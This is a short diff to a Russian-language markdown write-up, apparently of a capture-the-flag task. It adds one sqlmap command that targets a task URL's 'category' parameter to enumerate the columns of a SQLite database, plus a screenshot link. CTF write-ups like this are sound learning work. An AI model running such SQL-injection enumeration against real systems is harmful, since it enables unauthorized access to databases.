@@ -15,3 +15,6 @@
 
 ![Решения](images/Screenshot_2026-10-06_21_55_22.png)
 
+После этого сделал такой запрос: `sqlmap -u "http://task.duckerz.ru:21010/?category=Rare" --batch -D SQLite --columns`. Вот что получилось:
+
+![Решения](images/Screenshot_2026-10-06_22_00_10.png)
